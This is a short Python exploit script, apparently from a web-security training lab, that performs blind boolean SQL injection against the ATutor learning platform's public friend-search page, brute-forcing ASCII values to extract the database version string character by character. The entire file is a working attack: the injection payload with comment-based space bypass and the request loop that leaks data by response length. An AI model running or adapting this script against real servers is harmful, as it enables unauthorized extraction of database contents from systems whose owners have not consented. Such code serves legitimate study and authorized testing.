import requests
import sys

def searchFriends_sqli(ip, injection_string):
    #32 to 126 is the printable characters in the ASCII table
    for j in range(32,126):
        target="http://%s/ATutor/mods/_standard/social/index_public.php?q=%s" % (ip, injection_string.replace("[CHAR]", str(j)))
        r = requests.get(target)
        content_length = int(r.headers['Content-Length'])
        if (content_length > 20):
            return j 

    return None



def main():
    if len(sys.argv) != 2:
        print ("(+) usage: %s <target>") % sys.argv[0]
        print ("(+) eg: %s 192.168.211.203") % sys.argv[0]
        sys.exit(-1)

    ip = sys.argv[1]

    print ("[+] Retrieving database version...")

    #19 is length of the version() string - this can by dynamically obtained from database
    for i in range(1,20):
        injection_string = "test')/**/or/**/(ascii(substring((select/**/version()),%d,1)))=[CHAR]%%23" % i
        extracted_char = chr(searchFriends_sqli(ip, injection_string))
        sys.stdout.write(extracted_char)
        sys.stdout.flush()

        #select current_user()

    print ("\n[+] done")

if __name__ == "__main__":
    main()
